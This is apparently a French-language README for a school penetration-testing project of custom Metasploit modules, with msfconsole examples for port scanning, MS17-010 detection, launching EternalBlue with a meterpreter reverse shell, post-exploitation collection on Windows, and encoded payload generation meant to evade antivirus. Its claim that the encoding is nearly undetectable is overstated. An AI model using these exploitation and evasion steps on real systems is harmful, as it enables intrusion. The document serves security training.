# ğŸ›¡ï¸ 0x04. Metasploit Scripting

> **Custom Metasploit modules for professional penetration testing**

[![Metasploit](https://img.shields.io/badge/Metasploit-Framework-red?style=for-the-badge&logo=metasploit)](https://www.metasploit.com)
[![Ruby](https://img.shields.io/badge/Ruby-2.7+-CC342D?style=for-the-badge&logo=ruby)](https://www.ruby-lang.org)
[![License](https://img.shields.io/badge/License-Educational-blue?style=for-the-badge)](LICENSE)

---

## ğŸ“‹ Description

Ce projet se concentre sur la crÃ©ation de modules Metasploit personnalisÃ©s pour les tests d'intrusion. Il comprend **cinq modules** couvrant diffÃ©rents aspects du pentesting : scan de ports, dÃ©tection de vulnÃ©rabilitÃ©s, exploitation automatisÃ©e, collecte d'informations post-exploitation et gÃ©nÃ©ration de payloads encodÃ©s.

---

## ğŸ“ Structure du Projet

```
ğŸ“¦ 0x04_metasploit_scripting/
â”œâ”€â”€ ğŸ“„ README.md
â”œâ”€â”€ ğŸ” custom_port_scanner.rb
â”œâ”€â”€ ğŸ” vulnerability_checker.rb
â”œâ”€â”€ ğŸš€ automated_exploit_launcher.rb
â”œâ”€â”€ ğŸ“Š information_gathering.rb
â”œâ”€â”€ ğŸ’‰ custom_payload_generator.rb
â””â”€â”€ ğŸ“‚ modules/
    â”œâ”€â”€ ğŸ“‚ auxiliary/
    â”‚   â”œâ”€â”€ ğŸ“‚ scanner/
    â”‚   â”‚   â”œâ”€â”€ custom_port_scanner.rb
    â”‚   â”‚   â””â”€â”€ ms17_010_checker.rb
    â”‚   â””â”€â”€ automated_exploit_launcher.rb
    â””â”€â”€ ğŸ“‚ post/
        â””â”€â”€ ğŸ“‚ windows/
            â””â”€â”€ ğŸ“‚ gather/
                â””â”€â”€ information_gathering.rb
```

---

## ğŸ¯ Modules Disponibles

| Module | Type | IcÃ´ne | Description |
|--------|------|-------|-------------|
| **Custom Port Scanner** | Scanner | ğŸ” | Scanne une plage de ports TCP |
| **Vulnerability Checker** | Scanner | ğŸ” | DÃ©tecte MS17-010 (EternalBlue) |
| **Exploit Launcher** | Auxiliary | ğŸš€ | Lance des exploits automatiquement |
| **Information Gathering** | Post-Exploit | ğŸ“Š | Collecte des infos systÃ¨me |
| **Payload Generator** | Generator | ğŸ’‰ | GÃ©nÃ¨re des payloads encodÃ©s |

---

## ğŸ” Task 0: Custom Port Scanner

> **Scanne les ports TCP d'un systÃ¨me cible**

### âœ¨ FonctionnalitÃ©s

- âœ… Scan configurable de ports (STARTPORT Ã  ENDPORT)
- âœ… DÃ©tection et rapport des ports ouverts
- âœ… IntÃ©gration avec la base de donnÃ©es Metasploit
- âœ… Gestion des erreurs de connexion
- âœ… Sortie claire et structurÃ©e

### ğŸ“ Emplacement

```
modules/auxiliary/scanner/custom_port_scanner.rb
custom_port_scanner.rb
```

### ğŸ’» Exemple d'utilisation

```bash
msf6 > use auxiliary/scanner/custom_port_scanner
msf6 auxiliary(scanner/custom_port_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/custom_port_scanner) > set STARTPORT 20
msf6 auxiliary(scanner/custom_port_scanner) > set ENDPORT 1000
msf6 auxiliary(scanner/custom_port_scanner) > run

[*] Running module against 192.168.1.100
[+] 192.168.1.100:80 - Port 80 is open on 192.168.1.100
[+] 192.168.1.100:445 - Port 445 is open on 192.168.1.100
[*] 192.168.1.100:80 - Open ports on 192.168.1.100: 80, 445
[*] Auxiliary module execution completed
```

### âš™ï¸ Options du Module

| Option | DÃ©faut | Requis | Description |
|--------|--------|--------|-------------|
| ğŸ¯ RHOSTS | - | âœ… | HÃ´te(s) cible(s) Ã  scanner |
| ğŸ”¢ STARTPORT | 1 | âœ… | Port de dÃ©but |
| ğŸ”¢ ENDPORT | 1000 | âœ… | Port de fin |
| â±ï¸ TIMEOUT | 1 | âœ… | Timeout de connexion (secondes) |
| ğŸ”„ THREADS | 1 | âœ… | Nombre de threads |

---

## ğŸ” Task 1: Vulnerability Checker

> **DÃ©tecte la vulnÃ©rabilitÃ© MS17-010 (EternalBlue)**

### âœ¨ FonctionnalitÃ©s

- ğŸ” DÃ©tection non-intrusive de vulnÃ©rabilitÃ©
- ğŸ¯ VÃ©rifie MS17-010 (EternalBlue)
- ğŸ“¡ Analyse les rÃ©ponses du protocole SMB
- ğŸ’¾ Rapporte les rÃ©sultats dans la base Metasploit
- ğŸ“š Supporte plusieurs rÃ©fÃ©rences CVE

### ğŸ“ Emplacement

```
vulnerability_checker.rb
modules/auxiliary/scanner/ms17_010_checker.rb
```

### ğŸ’» Exemple d'utilisation

```bash
msf6 > use auxiliary/scanner/ms17_010_checker
msf6 auxiliary(scanner/ms17_010_checker) > set RHOST 172.31.128.202
RHOST => 172.31.128.202
msf6 auxiliary(scanner/ms17_010_checker) > run

[*] Checking 172.31.128.202 for MS17-010 vulnerability
[+] 172.31.128.202 is vulnerable to MS17-010.
[*] Auxiliary module execution completed
```

### ğŸ”– RÃ©fÃ©rences CVE

- ğŸ”´ CVE-2017-0143
- ğŸ”´ CVE-2017-0144
- ğŸ”´ CVE-2017-0145
- ğŸ”´ CVE-2017-0146
- ğŸ”´ CVE-2017-0147
- ğŸ”´ CVE-2017-0148

---

## ğŸš€ Task 2: Automated Exploit Launcher

> **Lance automatiquement des exploits avec payloads**

### âœ¨ FonctionnalitÃ©s

- ğŸ¯ Configure et lance automatiquement des exploits
- ğŸ“¦ Accepte IP cible, exploit et payload en paramÃ¨tres
- ğŸ”„ Configure LHOST et LPORT pour connexions reverse
- ğŸ’¼ CrÃ©e et suit les sessions
- âš ï¸ Gestion complÃ¨te des erreurs

### ğŸ“ Emplacement

```
automated_exploit_launcher.rb
modules/auxiliary/automated_exploit_launcher.rb
```

### ğŸ’» Exemple d'utilisation

```bash
msf6 > use auxiliary/automated_exploit_launcher
msf6 auxiliary(automated_exploit_launcher) > set RHOST 172.31.128.202
msf6 auxiliary(automated_exploit_launcher) > set EXPLOIT windows/smb/ms17_010_eternalblue
msf6 auxiliary(automated_exploit_launcher) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 auxiliary(automated_exploit_launcher) > set LHOST 10.0.0.1
msf6 auxiliary(automated_exploit_launcher) > set LPORT 4444
msf6 auxiliary(automated_exploit_launcher) > run

[*] Launching exploit windows/smb/ms17_010_eternalblue against 172.31.128.202 with payload windows/x64/meterpreter/reverse_tcp
[*] Running exploit...
[*] Sending stage (200262 bytes) to 172.31.128.202
[+] Exploit completed successfully!
[+] Session 1 created
```

### âš™ï¸ Options du Module

| Option | Requis | Description |
|--------|--------|-------------|
| ğŸ¯ RHOST | âœ… | Adresse IP cible |
| ğŸ’£ EXPLOIT | âœ… | Module d'exploit Ã  utiliser |
| ğŸ’‰ PAYLOAD | âœ… | Payload Ã  utiliser |
| ğŸ  LHOST | âœ… | IP locale pour connexion reverse |
| ğŸ”Œ LPORT | âœ… | Port local pour connexion reverse |

---

## ğŸ“Š Task 3: Information Gathering Script

> **Collecte des informations d'un systÃ¨me Windows compromis**

### âœ¨ FonctionnalitÃ©s

- ğŸ’» Collecte infos systÃ¨me (OS, nom PC, architecture)
- ğŸ‘¤ Ã‰numÃ©ration des comptes utilisateurs et privilÃ¨ges
- ğŸŒ Configuration rÃ©seau (interfaces, IPs, routage)
- ğŸ“‹ Liste des processus en cours
- ğŸ’¾ Stockage des donnÃ©es dans des fichiers loot

### ğŸ“ Emplacement

```
information_gathering.rb
modules/post/windows/gather/information_gathering.rb
```

### ğŸ’» Exemple d'utilisation

```bash
msf6 > use post/windows/gather/information_gathering
msf6 post(windows/gather/information_gathering) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/information_gathering) > run

[*] Gathering system information from 172.31.128.202
[*] OS: Windows 10 (Build 14393, 64-bit)
[*] Computer: WIN-ABC1234
[*] User: NT AUTHORITY\SYSTEM
[*] Interface: Ethernet0, IP: 192.168.1.20
[*] Process 1000 - explorer.exe
[*] Process 1050 - cmd.exe
[+] Information gathering completed successfully
```

### ğŸ“¦ Informations CollectÃ©es

| CatÃ©gorie | IcÃ´ne | DonnÃ©es |
|-----------|-------|---------|
| **SystÃ¨me** | ğŸ’» | OS, nom PC, architecture |
| **Utilisateurs** | ğŸ‘¤ | Comptes, privilÃ¨ges, contexte |
| **RÃ©seau** | ğŸŒ | Interfaces, IPs, routes, DNS |
| **Processus** | ğŸ“‹ | PIDs, noms, chemins, propriÃ©taires |

### ğŸ“„ Fichiers Loot GÃ©nÃ©rÃ©s

- ğŸ“„ `system_info.txt` - Informations systÃ¨me
- ğŸ“„ `user_info.txt` - Comptes et privilÃ¨ges
- ğŸ“„ `network_info.txt` - Configuration rÃ©seau
- ğŸ“„ `processes.txt` - Liste des processus

---

## ğŸ’‰ Task 4: Custom Payload Generator

> **GÃ©nÃ¨re des payloads encodÃ©s pour Ã©viter la dÃ©tection antivirus**

### âœ¨ FonctionnalitÃ©s

- ğŸ¨ GÃ©nÃ¨re des payloads personnalisÃ©s avec encodeurs
- ğŸ”’ Supporte shikata_ga_nai et autres encodeurs polymorphiques
- ğŸ“ Multiples formats de sortie (Ruby, C, Python, Raw, Hex)
- ğŸ”„ ItÃ©rations d'encodage configurables
- ğŸ’¾ Sauvegarde dans des fichiers
- ğŸ›¡ï¸ Ã‰vasion AV par encodage

### ğŸ“ Emplacement

```
custom_payload_generator.rb
```

### ğŸ’» Exemple d'utilisation

```bash
msf6 > use payload/custom_payload_generator
msf6 payload(custom_payload_generator) > set LHOST 192.168.1.10
msf6 payload(custom_payload_generator) > set LPORT 4444
msf6 payload(custom_payload_generator) > set ENCODER x86/shikata_ga_nai
msf6 payload(custom_payload_generator) > set ITERATIONS 3
msf6 payload(custom_payload_generator) > run

[*] Generating payload with encoding: x86/shikata_ga_nai
[+] Raw payload generated (460 bytes)
[*] Encoding payload (3 iterations)...
[+] Payload encoded successfully (492 bytes)
[+] Generated encoded payload: \xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0...
[+] Payload generation completed successfully!
```

### âš™ï¸ Options du Module

| Option | DÃ©faut | Requis | Description |
|--------|--------|--------|-------------|
| ğŸ’‰ PAYLOAD | windows/meterpreter/reverse_tcp | âœ… | Payload Ã  gÃ©nÃ©rer |
| ğŸ  LHOST | - | âœ… | IP locale |
| ğŸ”Œ LPORT | 4444 | âœ… | Port local |
| ğŸ”’ ENCODER | x86/shikata_ga_nai | âœ… | Encodeur Ã  utiliser |
| ğŸ”„ ITERATIONS | 3 | âœ… | Nombre d'itÃ©rations |
| ğŸ“ FORMAT | ruby | âœ… | Format de sortie |
| ğŸ’¾ OUTPUT | - | âŒ | Chemin fichier sortie |

### ğŸ”’ Encodeurs SupportÃ©s

| Encodeur | Type | RecommandÃ© |
|----------|------|------------|
| ğŸ¥‡ **x86/shikata_ga_nai** | Polymorphique XOR | â­â­â­â­â­ |
| ğŸ¥ˆ **x86/fnstenv_mov** | Variable-length XOR | â­â­â­â­ |
| ğŸ¥‰ **x86/jmp_call_additive** | Jump/Call XOR | â­â­â­ |
| ğŸ’  **x64/xor** | XOR 64-bit | â­â­â­ |
| ğŸŒ **x64/zutto_dekiru** | Zutto Dekiru | â­â­â­â­ |
| ğŸ’» **cmd/powershell_base64** | PowerShell Base64 | â­â­ |

### ğŸ“ Formats de Sortie

- ğŸ’ **ruby** - Format tableau Ruby
- ğŸ”§ **c** - Format tableau C
- ğŸ **python** - Format chaÃ®ne Python
- ğŸ“¦ **raw** - Format binaire brut
- ğŸ”¢ **hex** - Format hexadÃ©cimal

### ğŸŒ Ã€ propos de Shikata Ga Nai

> **"ä»•æ–¹ãŒãªã„" - "Ã‡a ne peut pas Ãªtre aidÃ©"**

L'encodeur **x86/shikata_ga_nai** est l'un des encodeurs polymorphiques les plus efficaces :

- ğŸ”„ Utilise l'encodage XOR avec feedback additif
- ğŸ² GÃ©nÃ¨re une sortie diffÃ©rente Ã  chaque fois
- ğŸ›¡ï¸ TrÃ¨s efficace contre la dÃ©tection AV basÃ©e sur signatures
- ğŸ”¢ ItÃ©rations recommandÃ©es : 3-10 pour Ã©vasion optimale
- ğŸ¯ Pratiquement impossible Ã  dÃ©tecter par signature

**Comment Ã§a marche :**
1. ğŸ“¥ Prend le payload brut en entrÃ©e
2. ğŸ”’ Applique l'encodage XOR polymorphique
3. ğŸ² Ajoute du padding alÃ©atoire et variations de clÃ©s
4. ğŸ”„ Chaque itÃ©ration augmente la complexitÃ©
5. âœ… Payload final quasi-impossible Ã  dÃ©tecter

---

## ğŸ“¥ Installation

### ğŸŒ Installation Globale (Tous les Modules)

```bash
# CrÃ©er la structure des rÃ©pertoires Metasploit
mkdir -p ~/.msf4/modules/auxiliary/scanner/
mkdir -p ~/.msf4/modules/auxiliary/
mkdir -p ~/.msf4/modules/post/windows/gather/
mkdir -p ~/.msf4/modules/payload/

# Copier tous les modules
cp custom_port_scanner.rb ~/.msf4/modules/auxiliary/scanner/
cp vulnerability_checker.rb ~/.msf4/modules/auxiliary/scanner/ms17_010_checker.rb
cp automated_exploit_launcher.rb ~/.msf4/modules/auxiliary/
cp information_gathering.rb ~/.msf4/modules/post/windows/gather/
cp custom_payload_generator.rb ~/.msf4/modules/payload/

# Recharger les modules dans msfconsole
msfconsole
msf6 > reload_all
```

### ğŸ”§ Utilisation avec loadpath (DÃ©veloppement)

```bash
msfconsole
msf6 > loadpath /path/to/0x04_metasploit_scripting/modules
msf6 > reload_all
```

### âœ… VÃ©rifier l'Installation

```bash
msf6 > search custom_port_scanner
msf6 > search ms17_010_checker
msf6 > search automated_exploit_launcher
msf6 > search information_gathering
msf6 > search custom_payload_generator
```

---

## ğŸ§ª Tester les Modules

Chaque module inclut un script de test pour validation :

```bash
# Test scanner de ports
./test_vulnerability_checker.sh        # âœ… Valide syntaxe + structure

# Test dÃ©tecteur de vulnÃ©rabilitÃ©
./test_vulnerability_checker.sh        # âœ… Simule dÃ©tection MS17-010

# Test lanceur d'exploits
./test_automated_launcher.sh           # âœ… Simule exploitation

# Test collecte d'infos
./test_information_gathering.sh        # âœ… Simule post-exploitation

# Test gÃ©nÃ©rateur payloads
./test_payload_generator.sh            # âœ… Simule gÃ©nÃ©ration encodÃ©e
```

**Chaque script de test valide :**
- âœ… Syntaxe Ruby correcte
- âœ… Structure du module
- âœ… Mixins requis
- âœ… Options enregistrÃ©es
- âœ… Sortie d'exÃ©cution simulÃ©e

---

## ğŸ”§ DÃ©pannage

### âŒ Module Non TrouvÃ©

```bash
# Recharger tous les modules
msf6 > reload_all

# VÃ©rifier les erreurs de chargement
msf6 > loadpath /path/to/modules/

# Rechercher un module spÃ©cifique
msf6 > search module_name
```

### âš ï¸ Erreurs de Syntaxe

```bash
# Valider la syntaxe Ruby
ruby -c module_name.rb
```

### ğŸ”’ Erreurs de Permission

```bash
# DÃ©finir les permissions appropriÃ©es
chmod 644 *.rb
```

---

## âš ï¸ Notes de SÃ©curitÃ©

> **ATTENTION** : Ces outils sont destinÃ©s aux tests de sÃ©curitÃ© autorisÃ©s uniquement.

### ğŸš¨ Avertissements Importants

- âœ… **Testez uniquement** les systÃ¨mes que vous possÃ©dez ou pour lesquels vous avez une autorisation Ã©crite explicite
- âš–ï¸ **Tests non autorisÃ©s** peuvent Ãªtre illÃ©gaux dans votre juridiction
- ğŸ” **DÃ©tection IDS/IPS** : Les scans et exploits peuvent Ãªtre dÃ©tectÃ©s
- ğŸ“ **Autorisation Ã©crite** : Obtenez toujours une autorisation avant les tests
- ğŸ¤ **Divulgation responsable** : Suivez les pratiques de divulgation Ã©thique
- ğŸ“Š **Documentation** : Documentez toutes les activitÃ©s de test
- ğŸ¯ **Respectez le scope** : Restez dans les limites du test d'intrusion

### ğŸ“‹ Checklist de ConformitÃ©

- [ ] Autorisation Ã©crite obtenue
- [ ] Scope du test dÃ©fini et acceptÃ©
- [ ] Dates et heures de test convenues
- [ ] Contact d'urgence identifiÃ©
- [ ] Plan de sauvegarde en place
- [ ] Accord de non-divulgation signÃ© (si applicable)
- [ ] Documentation de test prÃ©parÃ©e

---

## ğŸ“ Objectifs d'Apprentissage

En complÃ©tant ce projet, vous comprendrez :

### ğŸ”§ CompÃ©tences Techniques

- âœ… Structure et architecture des modules Metasploit
- âœ… Programmation Ruby pour outils de sÃ©curitÃ©
- âœ… Techniques de scan de ports TCP
- âœ… MÃ©thodologies d'Ã©valuation des vulnÃ©rabilitÃ©s
- âœ… Workflows d'exploitation automatisÃ©e
- âœ… Collecte d'informations post-exploitation
- âœ… Techniques de gÃ©nÃ©ration et encodage de payloads
- âœ… Ã‰vasion AV avec encodeurs polymorphiques

### ğŸ¯ CompÃ©tences Professionnelles

- âœ… Mixins Metasploit et hÃ©ritage
- âœ… IntÃ©gration base de donnÃ©es pour suivi
- âœ… Gestion d'erreurs dans opÃ©rations rÃ©seau
- âœ… DÃ©veloppement professionnel d'outils de sÃ©curitÃ©
- âœ… Documentation technique
- âœ… Tests et validation de modules

---

## ğŸ“š DÃ©tails Techniques

### ğŸ”· Types de Modules

| Type | IcÃ´ne | Description |
|------|-------|-------------|
| **Auxiliary** | ğŸ”§ | Scanners, DoS, fuzzers |
| **Post-Exploitation** | ğŸ“Š | Collecte d'infos aprÃ¨s compromission |
| **GÃ©nÃ©rateurs** | ğŸ’‰ | CrÃ©ation de payloads personnalisÃ©s |

### ğŸ§© Mixins Courants

```ruby
Msf::Exploit::Remote::Tcp           # ğŸ”Œ CapacitÃ©s connexion TCP
Msf::Exploit::Remote::SMB::Client   # ğŸ“¡ Support protocole SMB
Msf::Auxiliary::Scanner             # ğŸ” Framework scan multi-thread
Msf::Auxiliary::Report              # ğŸ’¾ Rapport base de donnÃ©es
Msf::Post::Windows::Registry        # ğŸ“‹ AccÃ¨s registre Windows
Msf::Post::Windows::Priv            # ğŸ‘¤ VÃ©rification privilÃ¨ges Windows
```

### ğŸ’¾ IntÃ©gration Base de DonnÃ©es

Tous les modules s'intÃ¨grent avec la base Metasploit pour :

- ğŸ” Suivre services et vulnÃ©rabilitÃ©s dÃ©couverts
- ğŸ’¼ Stocker informations de session
- ğŸ’¾ Sauvegarder loot et credentials
- ğŸ“Š GÃ©nÃ©rer rapports complets

---

## ğŸ“¦ Repository

- ğŸ“ **GitHub repository** : `holbertonschool-cyber_security`
- ğŸ“‚ **Directory** : `vulnerability_research_exploitation/0x04_metasploit_scripting`
- ğŸ“„ **Files** :
  - `custom_port_scanner.rb`
  - `vulnerability_checker.rb`
  - `automated_exploit_launcher.rb`
  - `information_gathering.rb`
  - `custom_payload_generator.rb`

---

## ğŸ‘¨â€ğŸ’» Auteur

**Holberton School** - SpÃ©cialisation CybersÃ©curitÃ©

---

## ğŸ“œ License

Ce projet fait partie du curriculum Holberton School.

---

## ğŸ¯ RÃ©sumÃ© Rapide

| # | Module | Type | Fonction | Commande |
|---|--------|------|----------|----------|
| 0ï¸âƒ£ | Port Scanner | ğŸ” Scanner | Scanne ports TCP | `use auxiliary/scanner/custom_port_scanner` |
| 1ï¸âƒ£ | Vulnerability Checker | ğŸ” Scanner | DÃ©tecte MS17-010 | `use auxiliary/scanner/ms17_010_checker` |
| 2ï¸âƒ£ | Exploit Launcher | ğŸš€ Auxiliary | Lance exploits | `use auxiliary/automated_exploit_launcher` |
| 3ï¸âƒ£ | Info Gathering | ğŸ“Š Post-Exploit | Collecte infos | `use post/windows/gather/information_gathering` |
| 4ï¸âƒ£ | Payload Generator | ğŸ’‰ Generator | GÃ©nÃ¨re payloads | `use payload/custom_payload_generator` |

---

<div align="center">

### ğŸ›¡ï¸ Restez Ã‰thique, Testez Responsablement ğŸ›¡ï¸

**Note** : Assurez-vous toujours d'avoir une autorisation appropriÃ©e avant de mener des activitÃ©s de test de sÃ©curitÃ©. Ces outils sont conÃ§us Ã  des fins Ã©ducatives et pour des tests d'intrusion autorisÃ©s uniquement.

---

**Made with â¤ï¸ by Holberton School Cybersecurity Students**

[![Holberton](https://img.shields.io/badge/Holberton-School-red?style=for-the-badge)](https://www.holbertonschool.com)

</div>
